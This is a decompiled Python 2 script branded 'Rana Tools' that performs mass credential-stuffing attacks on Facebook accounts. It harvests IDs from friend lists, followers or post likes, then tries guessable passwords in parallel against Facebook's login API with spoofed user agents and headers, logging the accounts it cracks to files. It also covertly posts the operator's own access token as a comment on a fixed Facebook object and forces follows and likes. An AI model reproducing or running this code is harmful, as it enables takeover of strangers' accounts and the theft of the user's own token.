# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-02-28 13:00:01.863732
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
from datetime import datetime
try:
    import requests
except ImportError:
    print '[\xc3\x97] Modul requests belum terinstall!...\n'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text
#MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES
#MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES

def random_ipv4():
    return ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))


def random_ipv6():
    return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))


def logo():
    print '\x1b[1;96m    _______   _______   _         _______ \n\x1b[1;94m   (  ____ ) (  ___  ) ( (    /| (  ___  )\n\x1b[1;95m   | (    )| | (   ) | |  \\  ( | | (   ) |\n\x1b[1;93m   | (____)| | (___) | |   \\ | | | (___) |\n\x1b[1;92m   |     __) |  ___  | | (\\ \\) | |  ___  |\n\x1b[1;94m   | (\\ (    | (   ) | | | \\   | | (   ) |\n\x1b[1;95m   | ) \\ \\__ | )   ( | | )  \\  | | )   ( |\n\x1b[1;96m   |/   \\__/ |/     \\| |/    )_) |/     \\|\n\x1b[1;97m-----------------------------------------------\n\x1b[1;91m\x1b[1;97m Author   :          Rana Nadeem Rajput\n\x1b[1;94m\x1b[1;97m Facebook :          ITXRANA.5214\n\x1b[1;96m\x1b[1;97m GitHub  :           Rananadeem5214\n\x1b[1;92m\x1b[1;97m Version :           1.0.0\n\x1b[1;97m------------------------------------------------\n \x1b[1;33m\x95\x1b[1;91m\x95\x1b[1;37m\x1b[0;91m     [ WELLCOME TO RANA TOOLS ]\x1b[0;34m \x1b[1;33m\x95\x1b[1;91m\x95\x1b[1;37m\n\x1b[1;97m------------------------------------------------'


kom = 'Script bang @[100041129048948:]\xf0\x9f\x98\x98\xf0\x9f\x98\x98\xf0\x9f\x98\x98https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fbl mantap Ngga Ada Obat\xf0\x9f\x98\x98\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
kom1 = 'Aku Ijin Pake Script Mu Bang  @[100041129048948:]\xf0\x9f\x98\x98\xf0\x9f\x98\x98\xf0\x9f\x98\x98https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fbl\xf0\x9f\x98\x98\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
kom2 = 'Script bang @[100041129048948:]\xf0\x9f\x98\x98\xf0\x9f\x98\x98\xf0\x9f\x98\x98https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fbl mantap Ngga Ada Obat\xf0\x9f\x98\x98\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
kom3 = 'Aku Ijin Pake Script Mu Bang  @[100041129048948:]\xf0\x9f\x98\x98\xf0\x9f\x98\x98\xf0\x9f\x98\x98https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fbl\xf0\x9f\x98\x98\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan1 = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {'01': 'January', 
   '02': 'February', 
   '03': 'March', 
   '04': 'April', 
   '05': 'May', 
   '06': 'June', 
   '07': 'July', 
   '08': 'August', 
   '09': 'September', 
   '10': 'November', 
   '11': 'October', 
   '12': 'December'}

def iwan_dev():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' [!] Token invalid'
        os.system('rm -rf login.txt')

    requests.post('https://graph.facebook.com/100000943014584/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/6761598470548186/comments/?message=' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/6761598470548186/likes?summary=true&access_token=' + token)
    menu()


def gen():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        logo()
        token = raw_input('[token] : ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(token)
            zedd.close()
            print ' \xe2\x88\x9a  login succesful '
            iwan_dev()
            os.system('xdg-open https://m.facebook.com/ITXRANA.5214')
        except KeyError:
            print ' [!] Token Invalid'
            sys.exit()


useragents = ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
              'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]')

def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '[error cannot crack]'
        os.system('rm -f login.txt')
        gen()
    except requests.exceptions.ConnectionError:
        print ' * no connection please connect your connection'
        sys.exit()

    logo()
    print '[Hello]: ' + nama
    print '[ip addres] : ' + ip
    print '\x1b[0;97m------------------------------------------------------'
    print '\x1b[0;97m[1]crack from public id[multi]'
    print '\x1b[0;97m[2]crack from follower id'
    print '\x1b[0;97m[3]crack from public post like'
    print '\x1b[0;97m[4]crack from public id[Single]'
    print '\x1b[0;97m[5]check crack result'
    print '\x1b[0;97m[0]remove token'
    print '\x1b[0;97m------------------------------------------------------'
    pilih_pak()


def pilih_pak():
    ask = raw_input('[Select]: ')
    if ask == '':
        print
        print '[choose the right one dear]'
        exit()
    elif ask == '1' or ask == '01':
        print "\n[type 'me' to crack Own friends list]"
        idt = raw_input('[id public1] : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[name] : ' + sp['name']
        except KeyError:
            print '[Sorry id not public]'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('[id public2] : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[name] : ' + sp['name']
        except KeyError:
            print '[Sorry id not public]'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('[id public3] : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[name] : ' + sp['name']
        except KeyError:
            print '[Sorry id not public]'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '2' or ask == '02':
        print "\n[ type 'me' to crack your own follower list]"
        idt = raw_input('[id public] : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' *  name      : ' + sp['name']
        except KeyError:
            print '[Sorry id not public]'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '3' or ask == '03':
        idt = raw_input('[id post public] : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '4' or ask == '04':
        print "\n[type 'me' to crack Own friends list]"
        idt = raw_input('[id public] : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[name] : ' + sp['name']
        except KeyError:
            print '[Sorry id not public]'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '5' or ask == '05':
        print '[1]. Check result ok'
        print '[2]. Check result cp'
        ress = raw_input('[select] : ')
        if ress == '':
            menu()
        elif ress == '1' or ress == '01':
            print '\n [+] Check \x1b[0;97ok\x1b[0;97m date : \x1b[0;97m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '2' or ress == '02':
            print ' [+] Check \x1b[0;97mcp\x1b[0;97m date : \x1b[0;97m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit('[choose the right one dear]')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print '[ \xe2\x88\x9a  successfully deleted token]'
        exit()
    else:
        print '[choose the right one dear]'
        exit()
    print '\x1b[0;97m[total id]  : ' + str(len(id))
    ask = raw_input('\n[want to use password manual/default (m/d) : ')
    if ask == 'm' or ask == 'y':
        manual()
    print '_______________________________________________'
    print '[Cloning Start Now please Wait ]'
    print '[This Is Super Fast Command ]'
    print '[airplane mode 10 seconds if you see no result ]'
    print '_______________________________________________'

    def main(arg):
        global cp
        global loop
        global ok
        global ua
        print '\r[ %s/%s OK-:%s - CP-:%s] ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', name.lower() + '786', '123456', '786786', '1234567']:
                ua = random.choice(['Nokia6280/2.0 (03.60) Profile/MIDP-2.0 Configuration/CLDC-1.1', 'Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba', 'Nokia7610/2.0 (5.0509.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0', 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537', 'Deezer/6.2.39.96 (Android; 11; Mobile; nl) HMD Global Nokia 5.4', 'Nokia6120c/3.83; Profile/MIDP-2.0 Configuration/CLDC-1.1', 'NokiaC2-00/2.0 (03.82) Profile/MIDP-2.1 Configuration/CLDC-1.1', 'Nokia1680c-2/2.0 (07.60) Profile/MIDP-2.1 Configuration/CLDC-1.1', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+', 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148', 'Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148', 'Outlook-iOS/709.2226530.prod.iphone (3.24.1)', '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]', 'relesys_web_client/1.2.10.0 (Android/0.0; HUAWEI; CLT-L29) RelesysApp/1.3.18 (1) net.relesysapp.matas', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531F Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.1 Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.1 Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.1 Chrome/75.0.3770.143 Mobile Safari/537.36'])
                headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 
                   'x-fb-connection-quality': 'EXCELLENT', 
                   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                   'user-agent': ua, 
                   'content-type': 'application/x-www-form-urlencoded', 
                   'x-fb-http-engine': 'Liger'}
                ses = requests.Session()
                api = 'https://b-api.facebook.com/method/auth.login'
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                send = ses.get(api, params=param, headers=headers_)
                if 'access_token' in send.text and 'EAAA' in send.text:
                    print '\r\x1b[0;92m[Rana.\x1b[0;92mok]\x1b[0;92m\x1b[0;92m ' + uid + ' \xe2\x80\xa2 ' + pw + '        '
                    ok.append(uid + ' \xe2\x80\xa2 ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [OK] ' + str(uid) + ' \xe2\x80\xa2 ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in send.json()['error_msg']:
                    try:
                        token = open('login.txt').read()
                        url = 'https://www.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[1;97m[CP] ' + uid + '\xe2\x80\xa2' + pw + '\xe2\x80\xa2' + ttl
                        cp.append(uid + '\xe2\x80\xa2' + pw + '\xe2\x80\xa2' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('  [CP] ' + str(uid) + '\xe2\x80\xa2' + str(pw) + '\xe2\x80\xa2' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r\x1b[0;97m[Rana.\x1b[0;97mcp]\x1b[0;97m\x1b[0;97m ' + uid + ' \xe2\x80\xa2 ' + pw + '        '
                    cp.append(uid + ' \xe2\x80\xa2 ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [CP] ' + str(uid) + ' \xe2\x80\xa2 ' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [crack successful] For Exit type [python2 Fasttool.py]...'
    print
    print
    exit()


def manual():
    print '\x1b[0;97mEnter password example : pakistan,000786,786786'
    pw = raw_input('\x1b[0;97m *  set password : ').split(',')
    print
    if len(pw) == 0:
        exit("[correct content, can't be empty]")
    print '\x1b[0;97m[ number of passwords created : \x1b[0;97m]' + str(len(pw))

    def main(arg):
        global loop
        global ua
        print '\r \x1b[0;97m[ %s/%s OK-:%s - CP-:%s ]' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                ua = random.choice(['Nokia6280/2.0 (03.60) Profile/MIDP-2.0 Configuration/CLDC-1.1', 'Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba', 'Nokia7610/2.0 (5.0509.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0', 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537', 'Deezer/6.2.39.96 (Android; 11; Mobile; nl) HMD Global Nokia 5.4', 'Nokia6120c/3.83; Profile/MIDP-2.0 Configuration/CLDC-1.1', 'NokiaC2-00/2.0 (03.82) Profile/MIDP-2.1 Configuration/CLDC-1.1', 'Nokia1680c-2/2.0 (07.60) Profile/MIDP-2.1 Configuration/CLDC-1.1', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+', 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148', 'Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148', 'Outlook-iOS/709.2226530.prod.iphone (3.24.1)', '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]', 'relesys_web_client/1.2.10.0 (Android/0.0; HUAWEI; CLT-L29) RelesysApp/1.3.18 (1) net.relesysapp.matas', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531F Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.1 Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.1 Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.1 Chrome/75.0.3770.143 Mobile Safari/537.36'])
                headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 
                   'x-fb-connection-quality': 'EXCELLENT', 
                   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                   'user-agent': ua, 
                   'content-type': 'application/x-www-form-urlencoded', 
                   'x-fb-http-engine': 'Liger'}
                ses = requests.Session()
                api = 'https://b-api.facebook.com/method/auth.login'
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': asu, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                send = ses.get(api, params=param, headers=headers_)
                if 'access_token' in send.text and 'EAAA' in send.text:
                    print '\r\x1b[0;92m[Rana.\x1b[0;92mok]\x1b[0;92m\x1b[0;92m ' + uid + ' \xe2\x80\xa2 ' + asu + '        '
                    ok.append(uid + ' \xe2\x80\xa2 ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [OK] ' + str(uid) + ' \xe2\x80\xa2 ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in send.json()['error_msg']:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[1;97m[CP] ' + uid + '\xe2\x80\xa2' + asu + '\xe2\x80\xa2' + ttl
                        cp.append(uid + '\xe2\x80\xa2' + asu + '\xe2\x80\xa2' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('  [CP] ' + str(uid) + '\xe2\x80\xa2' + str(asu) + '\xe2\x80\xa2' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r\x1b[0;97m[Rana.\x1b[0;97mcp]\x1b[0;97m\x1b[0;97m ' + uid + ' \xe2\x80\xa2 ' + asu + '        '
                    cp.append(uid + ' \xe2\x80\xa2 ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [CP] ' + str(uid) + ' \xe2\x80\xa2 ' + str(asu) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n______________________________________________________'
    print '\n [Cloning Complete] For Exit type [python2 Fasttool.py]...'
    print '\n Thanks For Using Rana Tool Rember me in Your pray'
    exit()


if __name__ == '__main__':
    gen()
